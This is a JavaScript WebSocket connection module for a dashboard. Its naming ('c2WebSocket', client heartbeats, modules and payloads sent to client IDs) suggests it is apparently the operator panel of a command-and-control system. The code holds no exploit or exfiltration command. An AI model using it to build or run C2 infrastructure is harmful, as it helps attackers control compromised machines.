/* frontend/dashboard/js/modules/websocket/connection.js */
import { updateClient, updateClients } from '../data/clients.js';
import { decodePacket, encodePacket, isJson } from './protocol.js';

let ws;

export function connectWebSocket() {
    const token = localStorage.getItem('auth_token');
    const login = localStorage.getItem('user_login');

    if (!token || !login) return window.location.href = '/sidebar/auth/auth.html';

    const prot = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${prot}//${location.host}/ws?login=${encodeURIComponent(login)}&token=${token}`);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
        console.log("[WS] Connected");
        // Пинг-понг для поддержания соединения
        setInterval(() => ws?.readyState === 1 && ws.send(encodePacket("SERVER", "ping")), 25000);
    };

    ws.onmessage = ({ data }) => {
        const pkg = decodePacket(data);
        if (!pkg || pkg.module === 'pong') return;

        if (pkg.module === 'AuthUpdate') {
            localStorage.removeItem('auth_token');
            return window.location.reload();
        }

        if (isJson(pkg.module)) {
            try {
                const decodedText = new TextDecoder().decode(pkg.payload);
                const rawData = JSON.parse(decodedText);

                if (pkg.module === 'ClientList' || Array.isArray(rawData)) {
                    updateClients(Array.isArray(rawData) ? rawData : [rawData]);
                } else {
                    /** * Передаем данные в обработчик.
                     * rawData.net === 'heartbeat' вернет true только для коротких пульсов.
                     * Для метаданных (DataScribe) вторым аргументом уйдет false,
                     * и сработает проверка на отсутствие auth_key внутри updateClient.
                     */
                    updateClient({ ...rawData, id: rawData.id || pkg.id }, rawData.net === 'heartbeat');
                }
            } catch (e) {
                console.error("[WS] JSON Parse Error:", e);
            }
        } else {
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
        }
    };

    ws.onclose = (e) => {
        if (e.code === 1008) {
            localStorage.clear();
            window.location.href = '/sidebar/auth/auth.html';
        } else {
            setTimeout(connectWebSocket, 5000); // Авто-реконнект
        }
    };

    window.c2WebSocket = {
        send: (id, mod, pay) => ws?.readyState === 1 && ws.send(encodePacket(id, mod, pay))
    };
}